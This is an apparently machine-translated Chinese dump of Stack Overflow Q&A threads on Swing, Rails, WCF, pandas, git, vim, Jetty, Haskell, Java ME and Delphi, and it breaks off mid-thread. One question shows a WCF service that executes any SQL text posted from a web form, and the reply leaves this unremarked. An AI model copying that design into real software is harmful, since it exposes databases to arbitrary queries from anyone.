    /**
     * Launch the application.
     */
    public static void main(String[] args) {
        EventQueue.invokeLater(new Runnable() {
            public void run() {
                try {
                    FrmMain frame = new FrmMain();
                    frame.setVisible(true);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });
    }

    /**
     * Create the frame.
     */
    public FrmMain() {
        setTitle("HelloJTree3");
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setBounds(100, 100, 450, 300);
        contentPane = new JPanel();
        contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
        contentPane.setLayout(new BorderLayout(0, 0));
        setContentPane(contentPane);

        JButton btnNewButton = new JButton("Click Me");
        btnNewButton.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent arg0) {
                doClick ();
            }
        });
        contentPane.add(btnNewButton, BorderLayout.NORTH);
        jarFilesDB = new JarFilesDB ();
        jarFilesDB.load(isAlpha);
        isAlpha = !isAlpha;
        jtree = new JTree(jarFilesDB.getRootNode ());
        JScrollPane scrollPane = new JScrollPane (jtree);
        contentPane.add(scrollPane, BorderLayout.CENTER);   
    }

    private void doClick () {
        jarFilesDB.load(isAlpha);
        isAlpha = !isAlpha;
    }

    private JarFilesDB jarFilesDB;
    private JTree jtree;
    private boolean isAlpha = false;
}

class JarFilesDB extends DefaultTreeModel {

    public JarFilesDB () {
        super (null);
    }

    public void load (boolean isAlpha) {
        if (rootNode == null)
            rootNode =  new DefaultMutableTreeNode("root");
        else
            rootNode.removeAllChildren ();

        String[] values;
        if (isAlpha)
            values = new String[] {"A", "A1", "A2", "B", "B1", "B2"};
        else
            values = new String[] {"10", "11", "12", "20", "21", "22"};

        DefaultMutableTreeNode childNode = new DefaultMutableTreeNode (values[0]);
        DefaultMutableTreeNode leafNode = new DefaultMutableTreeNode (values[1]);
        childNode.add(leafNode);
        leafNode = new DefaultMutableTreeNode (values[2]);
        childNode.add(leafNode);
        rootNode.add(childNode);

        childNode = new DefaultMutableTreeNode (values[3]);
        leafNode = new DefaultMutableTreeNode (values[4]);
        childNode.add(leafNode);
        leafNode = new DefaultMutableTreeNode (values[5]);
        childNode.add(leafNode);
        rootNode.add(childNode);
    }

    public TreeNode getRootNode () {
        return rootNode;
    }

    private DefaultMutableTreeNode rootNode = null;

} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-19T03:31:49.437

`add()`方法不会触发更新。最好使用`insertNodeInto`. 要修复，请添加以下内容：

```
nodeStructureChanged(rootNode); 
```

在`load()`方法结束时。

并使用它来初始化树：

```
jtree = new JTree(jarFilesDB); 
```

这是更新的 SSCCE，不确定它的意图是什么`rootNode`，所以我不理会它：

```
import java.awt.BorderLayout;
import java.awt.EventQueue;

import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.border.EmptyBorder;
import javax.swing.JButton;
import java.awt.event.ActionListener;
import java.awt.event.ActionEvent;
import javax.swing.JTree;
import javax.swing.JScrollPane;
import javax.swing.tree.*;

public class FrmMain extends JFrame {

    private JPanel contentPane;

    /**
     * Launch the application.
     */
    public static void main(String[] args) {
        EventQueue.invokeLater(new Runnable() {
            public void run() {
                try {
                    FrmMain frame = new FrmMain();
                    frame.setVisible(true);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });
    }

    /**
     * Create the frame.
     */
    public FrmMain() {
        setTitle("HelloJTree3");
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setBounds(100, 100, 450, 300);
        contentPane = new JPanel();
        contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
        contentPane.setLayout(new BorderLayout(0, 0));
        setContentPane(contentPane);

        JButton btnNewButton = new JButton("Click Me");
        btnNewButton.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent arg0) {
                doClick ();
            }
        });
        contentPane.add(btnNewButton, BorderLayout.NORTH);
        jarFilesDB = new JarFilesDB ();
        jarFilesDB.load(isAlpha);
        isAlpha = !isAlpha;
        //jtree = new JTree(jarFilesDB.getRootNode ());
        jtree = new JTree(jarFilesDB);
        JScrollPane scrollPane = new JScrollPane (jtree);
        contentPane.add(scrollPane, BorderLayout.CENTER); 
    }

    private void doClick () {
        jarFilesDB.load(isAlpha);
        isAlpha = !isAlpha;
    }

    private JarFilesDB jarFilesDB;
    private JTree jtree;
    private boolean isAlpha = false;
}

class JarFilesDB extends DefaultTreeModel {

    public JarFilesDB () {
        super (new DefaultMutableTreeNode("root"));
        rootNode = (DefaultMutableTreeNode) getRoot(); 
    }

    public void load (boolean isAlpha) {
        rootNode.removeAllChildren ();

        String[] values;
        if (isAlpha)
            values = new String[] {"A", "A1", "A2", "B", "B1", "B2"};
        else
            values = new String[] {"10", "11", "12", "20", "21", "22"};

        DefaultMutableTreeNode childNode = new DefaultMutableTreeNode (values[0]);
        DefaultMutableTreeNode leafNode = new DefaultMutableTreeNode (values[1]);
        childNode.add(leafNode);
        leafNode = new DefaultMutableTreeNode (values[2]);
        childNode.add(leafNode);

        rootNode.add(childNode);

        childNode = new DefaultMutableTreeNode (values[3]);
        leafNode = new DefaultMutableTreeNode (values[4]);
        childNode.add(leafNode);
        leafNode = new DefaultMutableTreeNode (values[5]);
        childNode.add(leafNode);
        rootNode.add(childNode);

        nodeStructureChanged(rootNode);
    }

    public TreeNode getRootNode () {
        return rootNode;
    }

    private DefaultMutableTreeNode rootNode = null;

} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-08-11T17:03:17.847

或者，您可以使用`JTree.updateUI()`

# devise - 为多个子域设计omniauth facebook？

> ID：11553354
> 
> 赞同：0
> 
> 时间：2012-07-19T03:03:15.960
> 
> 标签：devise, omniauth, facebook-oauth

我的网站上将有几个子域，每种语言一个，并且通过 facebook-omniauth 进行身份验证。为所有子域建立常量（FB id、秘密）的最佳方法是什么？我正在使用 Rails 3.1.x

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-13T21:14:14.773

解决方案：/config/initializers/session_store.rb

```
InfiniteshelterComDevise::Application.config.session_store :cookie_store, 
  :key => '_infiniteshelter.com-devise_session',
  :domain => TOP_DOMAIN 
```

常量 TOP_DOMAIN 类似于`'.infiniteshelter.com'`infiniteshelter.com、pt.infiniteshelter.com 和ru.infiniteshelter.com。

# javascript - 如何将用户从 jquery 移动表单键入的查询 SQL 发布到 WCF 服务并在 WCF 服务上运行该查询？

> ID：11553356
> 
> 赞同：0
> 
> 时间：2012-07-19T03:03:44.273
> 
> 标签：javascript, wcf, wcf-binding

我想创建一个 jquery 移动表单以从该表单键入 SQL 查询，然后将该查询发布到我的 wcf 服务，并让它将该查询运行到与我的 wcf 服务连接的数据库。但我陷入了我的 wcf 服务。我创建了一个 javascript 函数来以 json 格式发布我的查询，并且我尝试在我的 WCF 服务中构建一个方法来接收该查询（以 json 格式），但我的 WCF 服务说`method not allowed`。我不知道我的 WCF 服务有什么问题。你能帮我在 WCF 服务中创建正确的方法吗？

这是我到目前为止所做的：
我的服务配置：

```
<system.serviceModel>

    <services>
      <service name="WcfService.Service1" behaviorConfiguration="ServiceBehaviour">
        <endpoint address ="" binding="webHttpBinding" contract="WcfService.IService1" behaviorConfiguration="web">
        </endpoint>
      </service>
    </services>

    <behaviors>
      <serviceBehaviors>
        <behavior name="ServiceBehaviour">
          <serviceMetadata httpGetEnabled="true"/>
          <serviceDebug includeExceptionDetailInFaults="true"/>
        </behavior>
      </serviceBehaviors>
      <endpointBehaviors>
        <behavior name="web">
          <webHttp/>
        </behavior>
      </endpointBehaviors>
    </behaviors>

  </system.serviceModel> 
```

我的服务合同：

```
[ServiceContract]
public interface IService1{
    [OperationContract]
    //attribute for returning JSON format
    [WebInvoke(Method = "POST", 
        RequestFormat = WebMessageFormat.Json, 
        ResponseFormat = WebMessageFormat.Json,
        BodyStyle = WebMessageBodyStyle.Wrapped,
        UriTemplate = "/Execute")]
    //method
    void Execute(String query);
} 
```

我的服务等级：

```
public class Service1 : IService1{
    public void Execute(String query){
        string connectionString = ConfigurationManager.ConnectionStrings["ConnWf"].ConnectionString;
        using (SqlConnection conn = new SqlConnection(connectionString)){
            conn.Open();
            string cmdStr = String.Format(query);
            SqlCommand cmd = new SqlCommand(cmdStr, conn);
            SqlDataReader rd = cmd.ExecuteReader();
            conn.Close();
        }
    }
} 
```

我的javascript函数：

```
function sendToServer(query) {
            $.ajax({
                    beforeSend: function (xhr) {
                        $.mobile.showPageLoadingMsg();
                    },
                    complete: function () {
                        $.mobile.hidePageLoadingMsg();
                    },
                    type: "POST",
                    contentType: "application/json; charset=utf-8",
                    url: "http://www.greenfields.co.id:502/Service1.svc/Execute",
                    dataType: "json",
                    data: JSON.stringify(query),
                    crossDomain: true,
                    success:function(){
                        alert("SUCCESS");
                    },
                    error: function () { 
                        alert("ERROR"); 
                    }
                });
        } 
```

这是我的 jquery 移动表单：

```
<div data-role='page' id='query'>
        <div data-theme='a' data-role='header'>
            <h3>
                Execute Query
            </h3>
                <a data-inline="true" data-theme="b" href="#menu" data-shadow="true" data-iconshadow="true" data-wrapperels="span"  data-direction="reverse" data-icon="home" data-transition="slide"  data-role="button"><span class="ui-btn-text">Home</span></a>
        </div>
        <div data-role='content' style='padding: 15px'>
            <form class="ui-body ui-body-a ui-corner-all" method="post" action="sendToServer()">    
                <label for='text_query'>Query:</label>
                <textarea name='text_query' id='text_query'></textarea>
                <button value="submit-value" name="submit" data-theme="b" type="submit" aria-disabled="false">Execute</button>
            </form>
        </div>
</div> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T03:42:25.567

您的 AJAX 调用试图调用方法“exec”，而您的实际服务方法称为“Execute”。

[http://www.greenfields.co.id:502/Service1.svc/exec](http://www.greenfields.co.id:502/Service1.svc/exec)

应该：

[http://www.greenfields.co.id:502/Service1.svc/Execute](http://www.greenfields.co.id:502/Service1.svc/Execute)

# ruby-on-rails - 在同一页面上多次渲染轨道部分

> ID：11553360
> 
> 赞同：4
> 
> 时间：2012-07-19T03:04:28.347
> 
> 标签：ruby-on-rails, partial-views, render

我有一个部分，我在同一页面上渲染两次，但在两个不同的位置（一个在标准布局期间显示，一个在移动/平板电脑布局期间显示）。

部分在两个地方的渲染完全相同，所以如果可能的话，我想通过将其存储为变量来加速它；部分每次都进行 API 调用，而第二次调用完全没有必要，因为它是第一次 API 调用的重复。

有没有办法将返回的部分中的 HTML 存储为变量，然后将其用于两个渲染？

**编辑：**我希望在没有缓存的情况下做到这一点，因为这是一个非常简单的需求，我希望保持代码库的精简和可读性。是否可以将部分存储为字符串变量，然后引用两次？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-07-19T05:58:12.490

```
<% content_for :example do %>
  <%= render :your_partial %>
<%end%> 
```

然后调用`<%= yield :example %>`或`<%= content_for :example %>`任何你想要你的部分调用的地方。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-07-19T03:25:36.207

一种选择是使用片段缓存。用缓存块包装部分后，第二个调用应该显示第一个的缓存版本。例如：

```
<% cache do %>
  <%= render(:partial => 'my_partial') %>
<% end %>

... later in the same view ...

<% cache do %>
  <%= render(:partial => 'my_partial') %>
<% end %> 
```

要将渲染结果存储到字符串中，您可以尝试`render_to_string`. `AbstractController`参数与 for 相同`render`。

```
partial_string = render_to_string(:partial => 'my_partial') 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2019-01-19T14:55:03.107

*我正在为这个老问题添加一个答案，因为它在我刚刚进行的搜索中超过了谷歌。*

现在有另一种方法可以做到这一点（很长一段时间），[捕获助手](https://api.rubyonrails.org/classes/ActionView/Helpers/CaptureHelper.html#method-i-capture)。

```
<% reuse_my_partial = capture do %>
  <%= render partial: "your_partial" %>
<% end %>

<div class="visible-on-desktop"
  <%= reuse_my_partial %>
</div>

<div class="visible-on-mobile"
  <%= reuse_my_partial %>
</div> 
```

这比使用 content_for 更简单且更安全，因为不涉及其他可能修改的全局存储。

链接到使用实例 @vars 而不是本地变量的 rails 文档，因为他们希望它可用于他们的布局模板。这是您无需担心的细节，因为您在同一个模板文件中使用它。

# actionscript-3 - AS3 - e:MouseEvent = null？

> ID：11553367
> 
> 赞同：0
> 
> 时间：2012-07-19T03:05:41.417
> 
> 标签：actionscript-3, flash, actionscript

我正在阅读一个关于如何让炮塔跟随鼠标进行游戏的教程，我偶然发现了一些我以前从未见过的东西。

```
private function showGhostTurret(e:MouseEvent = null):void 
{
    var target_placeholder:Sprite = e.currentTarget as Sprite;
    ghost_turret.x = target_placeholder.x; 
    ghost_turret.y = target_placeholder.y;
    ghost_turret.visible = true;
} 
```

我从未见过有人将 (e:Event) 设置为 null，就像在第一行中一样。有人可以解释这样做的目的吗？如果您需要更多信息来回答，请告诉我。

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-19T03:14:22.687

那是一个[默认参数值](http://help.adobe.com/en_US/ActionScript/3.0_ProgrammingAS3/WS5b3ccc516d4fbf351e63e3d118a9b90204-7f56.html)。这意味着该参数`e`是可选的，因此您可以选择不将其包含在调用中`showGhostTurret()`并将`e`其分配给 value `null`。

我不确定这在这种特殊情况下有何用处，因为查看函数的主体`e`是绝对需要的。你说这是教程的一部分——也许它以后会变得有用？

# python - 在 Python/Pandas 中获取元素类型的有效方法

> ID：11553370
> 
> 赞同：1
> 
> 时间：2012-07-19T03:06:07.503
> 
> 标签：python, performance, types, pandas

跟进上[一个问题](https://stackoverflow.com/questions/11548005/numpy-or-pandas-keeping-array-type-as-integer-while-having-a-nan-value)，是否有一种首选的有效方式来获取列中每个对象的类型？这特别适用于`dtype`列的`object`允许列元素之间的异构类型（特别是允许数字`NaN`而不将其他元素的数据类型更改为`float`）的情况。

我还没有进行时间基准测试，但我对以下立即想到的明显方式（以及可能使用`map`or的变体`filter`）持怀疑态度。感兴趣的用例需要快速获取有关所有元素类型的信息，因此生成器等可能不会在这里提高效率。

```
# df is a pandas DataFrame with some column 'A', such that
# df['A'].dtype is 'object'

dfrm['A'].apply(type) #Or np.dtype, but this will fail for native types. 
```

另一个想法是使用 NumPy`vectorize`函数，但这真的会更有效率吗？例如，使用与上述相同的设置，我可以尝试：

```
import numpy as np
vtype = np.vectorize(lambda x: type(x)) # Gives error without lambda

vtype(dfrm['A']) 
```

这两个想法都导致了可行的输出，但我担心的是效率。

**添加**

我继续在 IPython 中做了一个小基准测试。首先是`vtype`上面，然后是`apply`路线。我重复了十几次，这个示例运行在我的机器上非常典型。

该`apply()`方法显然获胜，所以有充分的理由期望我不会比 with 更有效率`apply()`吗？

**为了`vtype()`**

```
In [49]: for ii in [100,1000,10000,100000,1000000,10000000]:
   ....:     dfrm = pandas.DataFrame({'A':np.random.rand(ii)})
   ....:     dfrm['A'] = dfrm['A'].astype(object)
   ....:     dfrm['A'][0:-1:2] = None
   ....:     st_time = time.time()
   ....:     tmp = vtype(dfrm['A'])
   ....:     ed_time = time.time()
   ....:     print "%s:\t\t %s"%(ii, ed_time-st_time)
   ....:     
100:         0.0351531505585
1000:        0.000324010848999
10000:       0.00209212303162
100000:      0.0224051475525
1000000:     0.211136102676
10000000:    2.2215731144 
```

**为了`apply()`**

```
In [50]: for ii in [100,1000,10000,100000,1000000,10000000]:
   ....:     dfrm = pandas.DataFrame({'A':np.random.rand(ii)})
   ....:     dfrm['A'] = dfrm['A'].astype(object)
   ....:     dfrm['A'][0:-1:2] = None
   ....:     st_time = time.time()
   ....:     tmp = dfrm['A'].apply(type)
   ....:     ed_time = time.time()
   ....:     print "%s:\t %s"%(ii, ed_time-st_time)
   ....:     
100:         0.000900983810425
1000:        0.000159025192261
10000:       0.00117015838623
100000:      0.0111050605774
1000000:     0.103563070297
10000000:    1.03093600273 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-19T14:55:45.917

`Series.apply`并`Series.map`使用`pandas.lib.map_infer`我编写的专门的 Cython 方法（）比使用`numpy.vectorize`.

# mysql - RDS 数据库的本地副本

> ID：11553371
> 
> 赞同：3
> 
> 时间：2012-07-19T03:06:09.080
> 
> 标签：mysql, replication, mysqldump, database-replication, amazon-rds

在过去的一个小时左右，我一直在做一些研究，并且我听到了一些关于 Amazon RDS 数据库复制的相互矛盾的信息。我的数据库非常大，有 15 个表，总大小为 4 GB。那么，基本上，我是否可以创建远程 RDS InnoDB 的本地副本，或者亚马逊不允许这样做？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-08T08:48:45.687

您可以创建 RDS 的副本，但只能作为另一个 RDS。您不能在 EC2 或本地机器上创建副本。

# git - 拆分回购后，新的回购要大很多倍

> ID：11553373
> 
> 赞同：4
> 
> 时间：2012-07-19T03:06:37.563
> 
> 标签：git

我最近拆分了一个 git repo ...

```
Project
    ProjectA
    ProjectB
    ProjectC 
```

...进入 3 个存储库...

```
ProjectA
ProjectB
ProjectC 
```

...使用以下指南：

[分离（移动）子目录到单独的 Git 存储库](https://stackoverflow.com/questions/359424/detach-subdirectory-into-separate-git-repository)

原始仓库（.git 目录）的大小为 3.7GB。该项目包含很多 .psd 文件。

问题是新存储库之一（ProjectC）现在是 5.9GB（.git 文件夹）。显然，发生了一些不再发生的压缩和/或差异。

我尝试使用以下方法重新打包和压缩：

git repack -a -d --depth=250 --window=250

根据此页面上的信息：

[http://metalinguist.wordpress.com/2007/12/06/the-woes-of-git-gc-aggressive-and-how-git-deltas-work/](http://metalinguist.wordpress.com/2007/12/06/the-woes-of-git-gc-aggressive-and-how-git-deltas-work/)

回购的大小没有改变。有没有办法让 repo 完全重新压缩和重新区分所有内容？我只是做错了什么吗？

三个原始项目没有共享任何文件，所以我怀疑能够在三个项目与一个项目之间进行比较是否有很大的差异。

我不缺磁盘空间，所以这在很大程度上只是一个教育练习......而且它让我发疯。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-19T06:34:52.880

好的，我将回答我自己的问题。我刚刚遇到了这个：

```
git gc --aggressive --prune=1day 
```

我会`git gc --aggressive`在 repo 上运行，大小没有真正的变化，但是添加`--prune=1day`了所有的差异。回购现在降至 1.9G。

# vim - 如何打印VIM当前的配色方案？

> ID：11553374
> 
> 赞同：27
> 
> 时间：2012-07-19T03:06:54.657
> 
> 标签：vim, color-scheme

我的颜色文件很复杂。我认为它会检测我的术语并即时生成颜色值。

有什么办法可以打印出生成的颜色吗？

* * *

## 回答 #1

> 赞同：49
> 
> 时间：2012-07-19T03:42:14.277

*   键入`:color`以查看当前的配色方案。
*   键入`:hi`以列出所有颜色组。
*   键入`:hi Statement`以查看*Statement*的颜色定义。（将*语句*更改为您想要的）

* * *

## 回答 #2

> 赞同：25
> 
> 时间：2012-07-20T16:04:16.140

此命令将打开一个新窗口，其中包含所有高亮组名称，以各自的颜色显示：

```
:so $VIMRUNTIME/syntax/hitest.vim 
```

或者

```
:runtime syntax/hitest.vim 
```

然后这个命令会把它变成一个等效的 HTML 文件（注意大写 Tee Oh）

```
:TOhtml 
```

保存文件并从您喜欢的浏览器以通常的方式打印出来。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2020-05-18T21:47:09.457

我有你使用的 Vim 8 `:colo`，`:color`或者`:colorscheme`

# jetty - 如何在 jetty6.1.24 中设置 jvm 堆大小

> ID：11553375
> 
> 赞同：0
> 
> 时间：2012-07-19T03:07:10.623
> 
> 标签：jetty, out-of-memory, permgen

我正在使用 jetty6.1.26，我直接在 webapps 文件夹中部署了一个 Web 应用程序。因为我的应用程序有很多罐子，所以当码头启动时

```
 java.lang.OutOfMemoryError: PermGen space 
```

我也在用tomcat6，把吹的线放在catline.sh的第一行就可以了。

```
JAVA_OPTS="$JAVA_OPTS -server -XX:PermSize=64M -XX:MaxPermSize=1024m" 
```

现在，如何在码头设置 java opts？提前致谢。

Ps：我修改了jetty-service.conf，更新了wrapper.java.maxmemory=1024 还是不行。谁有好的想法，谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-30T21:14:18.500

你如何启动码头？

如果您在 Ubuntu 上并使用 apt-get 安装了 jetty，您应该有一个文件 /etc/default/jetty 可以在其中编辑 JAVA_OPTIONS

# jquery - 如果图形和表格是客户端的，我如何构建这些的服务器端 pdf？

> ID：11553376
> 
> 赞同：1
> 
> 时间：2012-07-19T03:07:28.217
> 
> 标签：jquery, asp.net-mvc, pdf, charts, telerik

虽然这个问题是关于 Telerik 控件的，但它适用于任何客户端 jQuery 图形库。

我有一个通过 jQuery 库生成图表和表格的网站。所以浏览器显示实际上是从服务器返回的 json 数据、css 和 jquery 图形操作的混合体。

我需要能够构建一个视觉效果（图形、表格等）的 pdf 文件，这对于服务器来说似乎很自然。我的想法是将视觉效果构建为服务器上的图像文件，然后发送到客户端并构建 pdf。

是否有任何 Telerik 控件允许服务器端导出或保存到图像？这就是人们通常解决这个问题的方式吗？有没有更简单或更明显的方法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-22T13:24:30.437

出于我的目的，服务器必须具有从中生成 pdf 的图像。我正在使用一个客户端 javascript 库，它将图像发送回它所产生的服务器。我宁愿在服务器上构建图像而不是在客户端发送，但这会消除客户端的交互性。

一旦图像在服务器上，您可以将它们泵入 pdf 文件。上面链接的 Kendo 示例使用[http://inkscape.org/download/?lang=en](http://inkscape.org/download/?lang=en)作为服务器上的 pdf 生成库。

# iphone - ios项目白屏

> ID：11553377
> 
> 赞同：-1
> 
> 时间：2012-07-19T03:07:38.427
> 
> 标签：iphone, objective-c, ios

我只是试图复制一个现有的 iOS 项目。复制所有文件并修复所有错误后，我只是在应用程序启动时得到一个白屏。有任何想法吗？我没有任何 MainWindow.xib 文件，我的 plist 中也没有提到任何 xib 文件。下面是我的启动代码：

```
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
    // Override point for customization after application launch.
    MainMenuViewController *mainMenu = [[MainMenuViewController alloc] init];
    UINavigationController *navigationController = [[UINavigationController alloc] initWithRootViewController:mainMenu];
    self.window.rootViewController = navigationController;
    [self.window makeKeyAndVisible];
    return YES;
} 
```

当我在 MainMenuViewController 的 viewDidLoad 方法中设置断点时，它会很好地命中它。有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T03:29:39.093

我只是想通了...构建阶段的“复制捆绑资源”部分中缺少我的所有 .xib 文件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T03:28:44.350

```
MainMenuViewController *mainMenu = [[MainMenuViewController alloc] init]; 
```

您是否设置了 mainMenu 的视图框架？

# macos - 将布尔键添加到终端中的 plist

> ID：11553378
> 
> 赞同：-1
> 
> 时间：2012-07-19T03:07:48.477
> 
> 标签：macos, bash, shell, unix, terminal

我目前正在尝试创建一个终端外壳，它将一个名为“已禁用”的布尔键添加到现有 plist 中，并带有一个真实值。

到目前为止我有`defaults write "/System/Library/LaunchAgents/com.apple.AppStoreUpdateAgent" disabled -bool true`

我是在正确设置布尔值，还是应该没有`-bool`？“禁用”应该用引号引起来吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T16:49:03.497

`defaults write /System/Library/LaunchAgents/com.apple.AppStoreUpdateAgent disabled -bool true`应该是正确的。`disabled`不需要引号并且`-bool true`应该可以工作，但是正如@MichaelDautermann 提到的，您需要以root 身份运行它。

您也可以使用 卸载作业`launchctl unload -w /System/Library/LaunchAgents/com.apple.AppStoreUpdateAgent.plist`。

```
-w       Overrides the Disabled key and sets it to false. In previous ver-
         sions, this option would modify the configuration file. Now the
         state of the Disabled key is stored elsewhere on-disk. 
```

# haskell - 无点表示法、递归和模式匹配

> ID：11553379
> 
> 赞同：8
> 
> 时间：2012-07-19T03:07:49.530
> 
> 标签：haskell, pointfree

所以我不断听到很多关于无点编程的信息，我决定做一个小实验来测试我对它的掌握程度。这涉及采用一个带尖的函数来计算一个数字的阶乘并将其转换为无点形式。我设法做到了，但是无点结果的可读性远低于有针对性的结果。

```
-- pointed
fact 0 = 1
fact n = n * (fact (n-1))
-- point free
fact' = foldr1 (*) . takeWhile ((<) 0) . iterate (flip (-) 1) 
```

我是否遗漏了点自由符号所必需的东西，或者这是否像某些转换一样可读？对我来说，函数的很大一部分似乎`fact`是零上的模式匹配，事实上，模式匹配是我喜欢 Haskell 的最大原因之一。然而，无点符号似乎完全不允许这样做，以及其他一些非常有用的东西，比如列表推导。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-07-19T03:17:45.873

无点形式的规范阶乘是：

```
fact = product . enumFromTo 1 
```

（相当于`fact n = product [1..n]`）

我觉得这很有可读性。但是，我同意原始版本：

```
fact 0 = 1
fact n = n * (fact (n-1)) 
```

与定义非常匹配，并且可读性也很好。

无点形式的要点（哈！）是为了便于将函数推理为其他函数的组合。然而，阶乘函数并不是这种推理的最佳候选者。

很明显，决定权在你。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-11-11T10:09:04.130

对于每个代数联合数据类型，都应该存在其类型大小写鉴别器函数，该函数封装了该类型的模式匹配。我们已经有了

```
either :: (a -> c) -> (b -> c) -> Either a b -> c
maybe :: b -> (a -> b) -> Maybe a -> b 
```

同样，数字也必须有这样的功能，

```
num :: (Num a) => b -> (a -> b) -> a -> b
num z nz 0 = z
num z nz x = nz x 
```

所以我们可以写

```
import Control.Applicative
import Data.Function

fact :: (Num a) => a -> a
fact x = num 1 (\x-> (*) (fact (pred x)) x) x
       = num 1 ((*) =<< (fact.pred)) x 
```

IE

```
fact   = (num 1 . ((*) =<<) . (. pred)) fact
       = fix (num 1 . ((*) =<<) . (. pred)) 
```

# java - 如何在 Java ME 中的不同类之间切换显示

> ID：11553380
> 
> 赞同：3
> 
> 时间：2012-07-19T03:08:03.197
> 
> 标签：java, java-me, midp, lcdui

我正在开发一个 Java ME 程序。不同的形式位于不同的类中。我试图在主要`MIDlet`和类之间切换显示并成功。如何在两个班级之间做同样的事情？我只是 Java ME 的初学者。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-19T04:08:06.093

我使用以下代码相同，

*   首先在 Midlet 中显示一个静态的 Display 变量

    ```
    private static Display display; 
    ```

*   现在初始化类 Constructor 中的显示变量

    ```
    public MyMidlet() {
         display = Display.getDisplay(this);
    } 
    ```

*   现在在 Midlet 类中声明一个 getDisplay() 方法

    ```
    public static Display getDisplay () {
         return display;
    } 
    ```

现在您可以使用此 getDisplay() 方法获取当前 Display 的对象，然后设置任何类的表单

```
MyMidlet.getDisplay().setCurrent(form); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-19T16:15:45.880

简化是：

```
 Display.getDisplay(this).setCurrent(screen); 
```

其中**screen**是 LCDUI (Form, Alert...) 的实例或 Canvas 对象的实例。这是 MIDlet 的一个**实例**

# vim - Vim 映射 评论代码

> ID：11553382
> 
> 赞同：3
> 
> 时间：2012-07-19T03:08:11.297
> 
> 标签：vim, editor

我安装了[nerd commenter](https://github.com/scrooloose/nerdcommenter)，但无法使用我以前使用的键绑定。我不需要使用上面的插件，但是我想要实现的（在 MAC OSX 中）

1.  map (command + /) 切换当前行的注释 (//)（至少在插入模式下）
2.  如果选择了多行，则对所有行执行相同操作。
3.  如果选择多行使用块注释（/* .. */），那就太好了

谢谢你的帮助。

编辑：下面的映射解决了 1 和 2。现在，我希望我可以在选择多行时使用块注释，否则使用 (//)。

```
imap <D-/> <esc>,c<space>i
vmap <D-/> ,c<space>gv
map <D-/> ,c<space> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-19T04:12:23.767

这应该工作：

```
map <D-/> \c<space><CR>
imap <D-/> \c<space><CR> 
```

或性感评论（又名 /* */）：

```
map <D-/> \cc<space><CR>
imap <D-/> \cc<space><CR> 
```

您可以检查所有可能的评论地图写作`:help NERDCommenter`，然后将它们重新映射到您喜欢的内容。

# mysql - TADOConnection 在 delphi xe2 64 位中不起作用

> ID：11553384
> 
> 赞同：1
> 
> 时间：2012-07-19T03:08:24.873
> 
> 标签：mysql, delphi, ado, delphi-xe2

当我在 32 位 delphi 应用程序中运行此代码时，与 MySql 的连接已成功建立。

```
{$APPTYPE CONSOLE}

{$R *.res}

uses
  AdoDb,
  ActiveX,
  SysUtils;

Var
  LConn : TADOConnection;
begin
  try
    CoInitialize(nil);
    try
      LConn:=TADOConnection.Create(nil);
      try
        LConn.ConnectionString:='Driver={MySQL ODBC 5.1 Driver};Server=127.0.0.1;Database=mysql;User=*****; Password=*****;Option=3';
        LConn.Connected:=True;
        Writeln('Connected');
      finally
        LConn.Free;
      end;
    finally
      CoUninitialize;
    end;
  except
    on E: Exception do
      Writeln(E.ClassName, ': ', E.Message);
  end;
  Readln;
end. 
```

但是相同的代码代码失败了这个异常

> EOleException：[Microsoft][ODBC Driver Manager] 未找到数据源名称且未指定默认驱动程序

如果代码被编译为 64 位应用程序。问题是为什么相同的代码在 64 位应用程序中失败？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-19T03:11:44.623

为避免此异常，您必须安装[64 位的 MySQL ODBC 驱动程序](http://dev.mysql.com/downloads/connector/odbc/)。

# java - Canvas.rotate 调用导致绘制的项目消失？

> ID：11553387
> 
> 赞同：0
> 
> 时间：2012-07-19T03:09:01.213
> 
> 标签：java, android, android-canvas

我在将位图绘制到画布时尝试旋转它。问题是，当我调用 canvas.rotate(90) 时，之后绘制的任何内容实际上都没有被绘制。当我在那里进行旋转调用时，运行以下代码不会在屏幕上绘制任何内容。如果我拿出轮换电话，它会显示得很好。为什么旋转调用会阻止位图显示在画布上？

```
 canvas.save();
        canvas.rotate(90);
        canvas.drawBitmap(leaves, null, leafRect, bitmapPaint);
        canvas.restore(); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T03:12:51.527

